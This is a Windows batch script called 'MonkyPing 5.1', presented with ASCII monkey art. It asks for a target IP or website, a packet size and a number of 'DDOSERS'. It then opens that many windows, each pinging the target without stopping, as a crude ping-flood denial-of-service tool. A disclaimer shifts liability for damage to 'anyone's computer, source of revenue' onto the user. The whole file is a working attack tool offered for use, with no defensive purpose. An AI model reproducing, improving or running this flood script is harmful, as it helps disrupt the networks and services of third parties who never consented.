@echo off
Title MONKYPING5.1
color 2
echo         MONKYPING 5.1 
echo            __,__
echo   .--.  .-"     "-.  .--.
echo  / .. \/  .-. .-.  \/ .. \
echo ^| ^|  '^|  /   Y   \  ^|'  ^| ^|
echo ^| \   \  \ 0 ^| 0 /  /   / ^|
echo  \ '- ,\.-"`` ``"-./, -' /
echo   `'-' /_   ^ ^   _\ '-'`
echo       ^|  \._   _./  ^|
echo       \   \ `~` /   /
echo        '._ '-=-' _.'
echo           '~---~'
set /p D= IP/WEBSITE:
 
:START
color 0e
cls
echo (Max Amount 65500)
echo.
set /p O= PACKET SIZE:
 
color 0c
cls
echo ===============================================================================
echo =                          Use At Your Own Risk!                              =
echo ===============================================================================
echo                                                                 
echo Note: OrangeWhip242 and Monkey (the developers of this program) are not responsible for any malicious or otherwise harmful activity that may occur due to the usage of this program. By using MonkyPing, you agree that you are solely liable for any damages done to anyone's computer, source of revenue, or any other belonging. The developers of MonkyPing are not liable for any damages caused by MonkyPing to anyone's system. USE AT YOUR OWN RISK!!!
echo            __,__
echo   .--.  .-"     "-.  .--.
echo  / .. \/  .-. .-.  \/ .. \
echo ^| ^|  '^|  /   Y   \  ^|'  ^| ^|
echo ^| \   \  \ 0 ^| 0 /  /   / ^|
echo  \ '- ,\.-"`` ``"-./, -' /
echo   `'-' /_   ^ ^   _\ '-'`
echo       ^|  \._   _./  ^|
echo       \   \ `~` /   /
echo        '._ '-=-' _.'
echo           '~---~'
echo (There is no limit, but we don't recommend setting the value too high or else your computer might not be able to handle it.)
echo.
set /p S= HOW MAN DDOSERS:
cls
pause

:ping
FOR /L %%S IN (1, 1, %S%) DO start ping %D% -t -l %O%
goto START
